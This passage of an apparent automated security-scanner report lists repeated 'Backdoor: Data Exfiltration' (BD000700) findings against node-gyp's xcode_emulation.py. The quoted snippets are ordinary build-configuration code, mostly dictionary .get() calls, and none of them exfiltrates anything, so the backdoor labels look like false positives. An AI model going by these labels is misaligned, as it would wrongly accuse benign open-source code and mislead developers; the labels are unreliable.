            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1212,
                  "startColumn": 28,
                  "endLine": 1212,
                  "endColumn": 33,
                  "snippet": {
                    "text": "                    os.path.join(\"${TARGET_BUILD_DIR}\", \"gyp-mac-tool\"),\n                    key,\n                    settings.get(\"CODE_SIGN_ENTITLEMENTS\", \"\"),\n                    settings.get(\"PROVISIONING_PROFILE\", \"\"),\n                    os.path.join(\"${BUILT_PRODUCTS_DIR}\", product_name),\n                    False,\n                )\n",
                    "rendered": {
                      "text": "                    os.path.join(\"${TARGET_BUILD_DIR}\", \"gyp-mac-tool\"),\n                    key,\n                    settings.get(\"CODE_SIGN_ENTITLEMENTS\", \"\"),\n                    settings.get(\"PROVISIONING_PROFILE\", \"\"),\n                    os.path.join(\"${BUILT_PRODUCTS_DIR}\", product_name),\n                    False,\n                )\n",
                      "markdown": "`                    os.path.join(\"${TARGET_BUILD_DIR}\", \"gyp-mac-tool\"),\n                    key,\n                    settings.get(\"CODE_SIGN_ENTITLEMENTS\", \"\"),\n                    settings.get(\"PROVISIONING_PROFILE\", \"\"),\n                    os.path.join(\"${BUILT_PRODUCTS_DIR}\", product_name),\n                    False,\n                )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1211,
                  "startColumn": 28,
                  "endLine": 1211,
                  "endColumn": 33,
                  "snippet": {
                    "text": "                % (\n                    os.path.join(\"${TARGET_BUILD_DIR}\", \"gyp-mac-tool\"),\n                    key,\n                    settings.get(\"CODE_SIGN_ENTITLEMENTS\", \"\"),\n                    settings.get(\"PROVISIONING_PROFILE\", \"\"),\n                    os.path.join(\"${BUILT_PRODUCTS_DIR}\", product_name),\n                    False,\n",
                    "rendered": {
                      "text": "                % (\n                    os.path.join(\"${TARGET_BUILD_DIR}\", \"gyp-mac-tool\"),\n                    key,\n                    settings.get(\"CODE_SIGN_ENTITLEMENTS\", \"\"),\n                    settings.get(\"PROVISIONING_PROFILE\", \"\"),\n                    os.path.join(\"${BUILT_PRODUCTS_DIR}\", product_name),\n                    False,\n",
                      "markdown": "`                % (\n                    os.path.join(\"${TARGET_BUILD_DIR}\", \"gyp-mac-tool\"),\n                    key,\n                    settings.get(\"CODE_SIGN_ENTITLEMENTS\", \"\"),\n                    settings.get(\"PROVISIONING_PROFILE\", \"\"),\n                    os.path.join(\"${BUILT_PRODUCTS_DIR}\", product_name),\n                    False,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1198,
                  "startColumn": 36,
                  "endLine": 1198,
                  "endColumn": 41,
                  "snippet": {
                    "text": "                            os.path.join(\"${TARGET_BUILD_DIR}\", \"gyp-mac-tool\"),\n                            key,\n                            settings.get(\"CODE_SIGN_ENTITLEMENTS\", \"\"),\n                            settings.get(\"PROVISIONING_PROFILE\", \"\"),\n                            target,\n                            True,\n                        )\n",
                    "rendered": {
                      "text": "                            os.path.join(\"${TARGET_BUILD_DIR}\", \"gyp-mac-tool\"),\n                            key,\n                            settings.get(\"CODE_SIGN_ENTITLEMENTS\", \"\"),\n                            settings.get(\"PROVISIONING_PROFILE\", \"\"),\n                            target,\n                            True,\n                        )\n",
                      "markdown": "`                            os.path.join(\"${TARGET_BUILD_DIR}\", \"gyp-mac-tool\"),\n                            key,\n                            settings.get(\"CODE_SIGN_ENTITLEMENTS\", \"\"),\n                            settings.get(\"PROVISIONING_PROFILE\", \"\"),\n                            target,\n                            True,\n                        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1197,
                  "startColumn": 36,
                  "endLine": 1197,
                  "endColumn": 41,
                  "snippet": {
                    "text": "                        % (\n                            os.path.join(\"${TARGET_BUILD_DIR}\", \"gyp-mac-tool\"),\n                            key,\n                            settings.get(\"CODE_SIGN_ENTITLEMENTS\", \"\"),\n                            settings.get(\"PROVISIONING_PROFILE\", \"\"),\n                            target,\n                            True,\n",
                    "rendered": {
                      "text": "                        % (\n                            os.path.join(\"${TARGET_BUILD_DIR}\", \"gyp-mac-tool\"),\n                            key,\n                            settings.get(\"CODE_SIGN_ENTITLEMENTS\", \"\"),\n                            settings.get(\"PROVISIONING_PROFILE\", \"\"),\n                            target,\n                            True,\n",
                      "markdown": "`                        % (\n                            os.path.join(\"${TARGET_BUILD_DIR}\", \"gyp-mac-tool\"),\n                            key,\n                            settings.get(\"CODE_SIGN_ENTITLEMENTS\", \"\"),\n                            settings.get(\"PROVISIONING_PROFILE\", \"\"),\n                            target,\n                            True,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1182,
                  "startColumn": 36,
                  "endLine": 1182,
                  "endColumn": 41,
                  "snippet": {
                    "text": "                            os.path.join(\"${TARGET_BUILD_DIR}\", \"gyp-mac-tool\"),\n                            key,\n                            settings.get(\"CODE_SIGN_ENTITLEMENTS\", \"\"),\n                            settings.get(\"PROVISIONING_PROFILE\", \"\"),\n                            destination,\n                            True,\n                        )\n",
                    "rendered": {
                      "text": "                            os.path.join(\"${TARGET_BUILD_DIR}\", \"gyp-mac-tool\"),\n                            key,\n                            settings.get(\"CODE_SIGN_ENTITLEMENTS\", \"\"),\n                            settings.get(\"PROVISIONING_PROFILE\", \"\"),\n                            destination,\n                            True,\n                        )\n",
                      "markdown": "`                            os.path.join(\"${TARGET_BUILD_DIR}\", \"gyp-mac-tool\"),\n                            key,\n                            settings.get(\"CODE_SIGN_ENTITLEMENTS\", \"\"),\n                            settings.get(\"PROVISIONING_PROFILE\", \"\"),\n                            destination,\n                            True,\n                        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1181,
                  "startColumn": 36,
                  "endLine": 1181,
                  "endColumn": 41,
                  "snippet": {
                    "text": "                        % (\n                            os.path.join(\"${TARGET_BUILD_DIR}\", \"gyp-mac-tool\"),\n                            key,\n                            settings.get(\"CODE_SIGN_ENTITLEMENTS\", \"\"),\n                            settings.get(\"PROVISIONING_PROFILE\", \"\"),\n                            destination,\n                            True,\n",
                    "rendered": {
                      "text": "                        % (\n                            os.path.join(\"${TARGET_BUILD_DIR}\", \"gyp-mac-tool\"),\n                            key,\n                            settings.get(\"CODE_SIGN_ENTITLEMENTS\", \"\"),\n                            settings.get(\"PROVISIONING_PROFILE\", \"\"),\n                            destination,\n                            True,\n",
                      "markdown": "`                        % (\n                            os.path.join(\"${TARGET_BUILD_DIR}\", \"gyp-mac-tool\"),\n                            key,\n                            settings.get(\"CODE_SIGN_ENTITLEMENTS\", \"\"),\n                            settings.get(\"PROVISIONING_PROFILE\", \"\"),\n                            destination,\n                            True,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1162,
                  "startColumn": 48,
                  "endLine": 1162,
                  "endColumn": 53,
                  "snippet": {
                    "text": "\n        if self._IsXCTest():\n            # For device xctests, Xcode copies two extra frameworks into $TEST_HOST.\n            test_host = os.path.dirname(settings.get(\"TEST_HOST\"))\n            frameworks_dir = os.path.join(test_host, \"Frameworks\")\n            platform_root = self._XcodePlatformPath(configname)\n            frameworks = [\n",
                    "rendered": {
                      "text": "\n        if self._IsXCTest():\n            # For device xctests, Xcode copies two extra frameworks into $TEST_HOST.\n            test_host = os.path.dirname(settings.get(\"TEST_HOST\"))\n            frameworks_dir = os.path.join(test_host, \"Frameworks\")\n            platform_root = self._XcodePlatformPath(configname)\n            frameworks = [\n",
                      "markdown": "`\n        if self._IsXCTest():\n            # For device xctests, Xcode copies two extra frameworks into $TEST_HOST.\n            test_host = os.path.dirname(settings.get(\"TEST_HOST\"))\n            frameworks_dir = os.path.join(test_host, \"Frameworks\")\n            platform_root = self._XcodePlatformPath(configname)\n            frameworks = [\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1143,
                  "startColumn": 48,
                  "endLine": 1143,
                  "endColumn": 53,
                  "snippet": {
                    "text": "        # Xcode expects XCTests to be copied into the TEST_HOST dir.\n        if self._IsXCTest():\n            source = os.path.join(\"${BUILT_PRODUCTS_DIR}\", product_name)\n            test_host = os.path.dirname(settings.get(\"TEST_HOST\"))\n            xctest_destination = os.path.join(test_host, \"PlugIns\", product_name)\n            postbuilds.extend([f\"ditto {source} {xctest_destination}\"])\n\n",
                    "rendered": {
                      "text": "        # Xcode expects XCTests to be copied into the TEST_HOST dir.\n        if self._IsXCTest():\n            source = os.path.join(\"${BUILT_PRODUCTS_DIR}\", product_name)\n            test_host = os.path.dirname(settings.get(\"TEST_HOST\"))\n            xctest_destination = os.path.join(test_host, \"PlugIns\", product_name)\n            postbuilds.extend([f\"ditto {source} {xctest_destination}\"])\n\n",
                      "markdown": "`        # Xcode expects XCTests to be copied into the TEST_HOST dir.\n        if self._IsXCTest():\n            source = os.path.join(\"${BUILT_PRODUCTS_DIR}\", product_name)\n            test_host = os.path.dirname(settings.get(\"TEST_HOST\"))\n            xctest_destination = os.path.join(test_host, \"PlugIns\", product_name)\n            postbuilds.extend([f\"ditto {source} {xctest_destination}\"])\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1084,
                  "startColumn": 51,
                  "endLine": 1084,
                  "endColumn": 56,
                  "snippet": {
                    "text": "                strip_style\n            ]\n\n            explicit_strip_flags = self._Settings().get(\"STRIPFLAGS\", \"\")\n            if explicit_strip_flags:\n                strip_flags += \" \" + _NormalizeEnvVarReferences(explicit_strip_flags)\n\n",
                    "rendered": {
                      "text": "                strip_style\n            ]\n\n            explicit_strip_flags = self._Settings().get(\"STRIPFLAGS\", \"\")\n            if explicit_strip_flags:\n                strip_flags += \" \" + _NormalizeEnvVarReferences(explicit_strip_flags)\n\n",
                      "markdown": "`                strip_style\n            ]\n\n            explicit_strip_flags = self._Settings().get(\"STRIPFLAGS\", \"\")\n            if explicit_strip_flags:\n                strip_flags += \" \" + _NormalizeEnvVarReferences(explicit_strip_flags)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1079,
                  "startColumn": 42,
                  "endLine": 1079,
                  "endColumn": 47,
                  "snippet": {
                    "text": "            elif self.spec[\"type\"] == \"executable\":\n                default_strip_style = \"all\"\n\n            strip_style = self._Settings().get(\"STRIP_STYLE\", default_strip_style)\n            strip_flags = {\"all\": \"\", \"non-global\": \"-x\", \"debugging\": \"-S\"}[\n                strip_style\n            ]\n",
                    "rendered": {
                      "text": "            elif self.spec[\"type\"] == \"executable\":\n                default_strip_style = \"all\"\n\n            strip_style = self._Settings().get(\"STRIP_STYLE\", default_strip_style)\n            strip_flags = {\"all\": \"\", \"non-global\": \"-x\", \"debugging\": \"-S\"}[\n                strip_style\n            ]\n",
                      "markdown": "`            elif self.spec[\"type\"] == \"executable\":\n                default_strip_style = \"all\"\n\n            strip_style = self._Settings().get(\"STRIP_STYLE\", default_strip_style)\n            strip_flags = {\"all\": \"\", \"non-global\": \"-x\", \"debugging\": \"-S\"}[\n                strip_style\n            ]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1052,
                  "startColumn": 64,
                  "endLine": 1052,
                  "endColumn": 69,
                  "snippet": {
                    "text": "                result = self.xcode_settings[configname].get(setting, None)\n                is_first_pass = False\n            else:\n                assert result == self.xcode_settings[configname].get(setting, None), (\n                    \"Expected per-target setting for '%s', got per-config setting \"\n                    \"(target %s)\" % (setting, self.spec[\"target_name\"])\n                )\n",
                    "rendered": {
                      "text": "                result = self.xcode_settings[configname].get(setting, None)\n                is_first_pass = False\n            else:\n                assert result == self.xcode_settings[configname].get(setting, None), (\n                    \"Expected per-target setting for '%s', got per-config setting \"\n                    \"(target %s)\" % (setting, self.spec[\"target_name\"])\n                )\n",
                      "markdown": "`                result = self.xcode_settings[configname].get(setting, None)\n                is_first_pass = False\n            else:\n                assert result == self.xcode_settings[configname].get(setting, None), (\n                    \"Expected per-target setting for '%s', got per-config setting \"\n                    \"(target %s)\" % (setting, self.spec[\"target_name\"])\n                )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1049,
                  "startColumn": 56,
                  "endLine": 1049,
                  "endColumn": 61,
                  "snippet": {
                    "text": "        result = None\n        for configname in sorted(self.xcode_settings.keys()):\n            if is_first_pass:\n                result = self.xcode_settings[configname].get(setting, None)\n                is_first_pass = False\n            else:\n                assert result == self.xcode_settings[configname].get(setting, None), (\n",
                    "rendered": {
                      "text": "        result = None\n        for configname in sorted(self.xcode_settings.keys()):\n            if is_first_pass:\n                result = self.xcode_settings[configname].get(setting, None)\n                is_first_pass = False\n            else:\n                assert result == self.xcode_settings[configname].get(setting, None), (\n",
                      "markdown": "`        result = None\n        for configname in sorted(self.xcode_settings.keys()):\n            if is_first_pass:\n                result = self.xcode_settings[configname].get(setting, None)\n                is_first_pass = False\n            else:\n                assert result == self.xcode_settings[configname].get(setting, None), (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1038,
                  "startColumn": 50,
                  "endLine": 1038,
                  "endColumn": 55,
                  "snippet": {
                    "text": "\n    def GetPerConfigSetting(self, setting, configname, default=None):\n        if configname in self.xcode_settings:\n            return self.xcode_settings[configname].get(setting, default)\n        else:\n            return self.GetPerTargetSetting(setting, default)\n\n",
                    "rendered": {
                      "text": "\n    def GetPerConfigSetting(self, setting, configname, default=None):\n        if configname in self.xcode_settings:\n            return self.xcode_settings[configname].get(setting, default)\n        else:\n            return self.GetPerTargetSetting(setting, default)\n\n",
                      "markdown": "`\n    def GetPerConfigSetting(self, setting, configname, default=None):\n        if configname in self.xcode_settings:\n            return self.xcode_settings[configname].get(setting, default)\n        else:\n            return self.GetPerTargetSetting(setting, default)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1012,
                  "startColumn": 43,
                  "endLine": 1012,
                  "endColumn": 48,
                  "snippet": {
                    "text": "        self.configname = configname\n        libtoolflags = []\n\n        for libtoolflag in self._Settings().get(\"OTHER_LDFLAGS\", []):\n            libtoolflags.append(libtoolflag)\n        # TODO(thakis): ARCHS?\n\n",
                    "rendered": {
                      "text": "        self.configname = configname\n        libtoolflags = []\n\n        for libtoolflag in self._Settings().get(\"OTHER_LDFLAGS\", []):\n            libtoolflags.append(libtoolflag)\n        # TODO(thakis): ARCHS?\n\n",
                      "markdown": "`        self.configname = configname\n        libtoolflags = []\n\n        for libtoolflag in self._Settings().get(\"OTHER_LDFLAGS\", []):\n            libtoolflags.append(libtoolflag)\n        # TODO(thakis): ARCHS?\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 969,
                  "startColumn": 31,
                  "endLine": 969,
                  "endColumn": 36,
                  "snippet": {
                    "text": "        if not sdk_root:\n            sdk_root = \"\"\n        config = self.spec[\"configurations\"][self.configname]\n        framework_dirs = config.get(\"mac_framework_dirs\", [])\n        for directory in framework_dirs:\n            ldflags.append(\"-F\" + directory.replace(\"$(SDKROOT)\", sdk_root))\n\n",
                    "rendered": {
                      "text": "        if not sdk_root:\n            sdk_root = \"\"\n        config = self.spec[\"configurations\"][self.configname]\n        framework_dirs = config.get(\"mac_framework_dirs\", [])\n        for directory in framework_dirs:\n            ldflags.append(\"-F\" + directory.replace(\"$(SDKROOT)\", sdk_root))\n\n",
                      "markdown": "`        if not sdk_root:\n            sdk_root = \"\"\n        config = self.spec[\"configurations\"][self.configname]\n        framework_dirs = config.get(\"mac_framework_dirs\", [])\n        for directory in framework_dirs:\n            ldflags.append(\"-F\" + directory.replace(\"$(SDKROOT)\", sdk_root))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 962,
                  "startColumn": 37,
                  "endLine": 962,
                  "endColumn": 42,
                  "snippet": {
                    "text": "            ldflags.append(\"-install_name\")\n            ldflags.append(install_name.replace(\" \", r\"\\ \"))\n\n        for rpath in self._Settings().get(\"LD_RUNPATH_SEARCH_PATHS\", []):\n            ldflags.append(\"-Wl,-rpath,\" + rpath)\n\n        sdk_root = self._SdkPath()\n",
                    "rendered": {
                      "text": "            ldflags.append(\"-install_name\")\n            ldflags.append(install_name.replace(\" \", r\"\\ \"))\n\n        for rpath in self._Settings().get(\"LD_RUNPATH_SEARCH_PATHS\", []):\n            ldflags.append(\"-Wl,-rpath,\" + rpath)\n\n        sdk_root = self._SdkPath()\n",
                      "markdown": "`            ldflags.append(\"-install_name\")\n            ldflags.append(install_name.replace(\" \", r\"\\ \"))\n\n        for rpath in self._Settings().get(\"LD_RUNPATH_SEARCH_PATHS\", []):\n            ldflags.append(\"-Wl,-rpath,\" + rpath)\n\n        sdk_root = self._SdkPath()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 932,
                  "startColumn": 44,
                  "endLine": 932,
                  "endColumn": 49,
                  "snippet": {
                    "text": "            ldflags.append(\"-isysroot\")\n            ldflags.append(self._SdkPath())\n\n        for library_path in self._Settings().get(\"LIBRARY_SEARCH_PATHS\", []):\n            ldflags.append(\"-L\" + gyp_to_build_path(library_path))\n\n        if \"ORDER_FILE\" in self._Settings():\n",
                    "rendered": {
                      "text": "            ldflags.append(\"-isysroot\")\n            ldflags.append(self._SdkPath())\n\n        for library_path in self._Settings().get(\"LIBRARY_SEARCH_PATHS\", []):\n            ldflags.append(\"-L\" + gyp_to_build_path(library_path))\n\n        if \"ORDER_FILE\" in self._Settings():\n",
                      "markdown": "`            ldflags.append(\"-isysroot\")\n            ldflags.append(self._SdkPath())\n\n        for library_path in self._Settings().get(\"LIBRARY_SEARCH_PATHS\", []):\n            ldflags.append(\"-L\" + gyp_to_build_path(library_path))\n\n        if \"ORDER_FILE\" in self._Settings():\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 912,
                  "startColumn": 38,
                  "endLine": 912,
                  "endColumn": 43,
                  "snippet": {
                    "text": "\n        # The xcode build is relative to a gyp file's directory, and OTHER_LDFLAGS\n        # can contain entries that depend on this. Explicitly absolutify these.\n        for ldflag in self._Settings().get(\"OTHER_LDFLAGS\", []):\n            ldflags.append(self._MapLinkerFlagFilename(ldflag, gyp_to_build_path))\n\n        if self._Test(\"DEAD_CODE_STRIPPING\", \"YES\", default=\"NO\"):\n",
                    "rendered": {
                      "text": "\n        # The xcode build is relative to a gyp file's directory, and OTHER_LDFLAGS\n        # can contain entries that depend on this. Explicitly absolutify these.\n        for ldflag in self._Settings().get(\"OTHER_LDFLAGS\", []):\n            ldflags.append(self._MapLinkerFlagFilename(ldflag, gyp_to_build_path))\n\n        if self._Test(\"DEAD_CODE_STRIPPING\", \"YES\", default=\"NO\"):\n",
                      "markdown": "`\n        # The xcode build is relative to a gyp file's directory, and OTHER_LDFLAGS\n        # can contain entries that depend on this. Explicitly absolutify these.\n        for ldflag in self._Settings().get(\"OTHER_LDFLAGS\", []):\n            ldflags.append(self._MapLinkerFlagFilename(ldflag, gyp_to_build_path))\n\n        if self._Test(\"DEAD_CODE_STRIPPING\", \"YES\", default=\"NO\"):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 754,
                  "startColumn": 36,
                  "endLine": 754,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        return cflags_cc\n\n    def _AddObjectiveCGarbageCollectionFlags(self, flags):\n        gc_policy = self._Settings().get(\"GCC_ENABLE_OBJC_GC\", \"unsupported\")\n        if gc_policy == \"supported\":\n            flags.append(\"-fobjc-gc\")\n        elif gc_policy == \"required\":\n",
                    "rendered": {
                      "text": "        return cflags_cc\n\n    def _AddObjectiveCGarbageCollectionFlags(self, flags):\n        gc_policy = self._Settings().get(\"GCC_ENABLE_OBJC_GC\", \"unsupported\")\n        if gc_policy == \"supported\":\n            flags.append(\"-fobjc-gc\")\n        elif gc_policy == \"required\":\n",
                      "markdown": "`        return cflags_cc\n\n    def _AddObjectiveCGarbageCollectionFlags(self, flags):\n        gc_policy = self._Settings().get(\"GCC_ENABLE_OBJC_GC\", \"unsupported\")\n        if gc_policy == \"supported\":\n            flags.append(\"-fobjc-gc\")\n        elif gc_policy == \"required\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 745,
                  "startColumn": 49,
                  "endLine": 745,
                  "endColumn": 54,
                  "snippet": {
                    "text": "            if flag in (\"$inherited\", \"$(inherited)\", \"${inherited}\"):\n                flag = \"$OTHER_CFLAGS\"\n            if flag in (\"$OTHER_CFLAGS\", \"$(OTHER_CFLAGS)\", \"${OTHER_CFLAGS}\"):\n                other_ccflags += self._Settings().get(\"OTHER_CFLAGS\", [])\n            else:\n                other_ccflags.append(flag)\n        cflags_cc += other_ccflags\n",
                    "rendered": {
                      "text": "            if flag in (\"$inherited\", \"$(inherited)\", \"${inherited}\"):\n                flag = \"$OTHER_CFLAGS\"\n            if flag in (\"$OTHER_CFLAGS\", \"$(OTHER_CFLAGS)\", \"${OTHER_CFLAGS}\"):\n                other_ccflags += self._Settings().get(\"OTHER_CFLAGS\", [])\n            else:\n                other_ccflags.append(flag)\n        cflags_cc += other_ccflags\n",
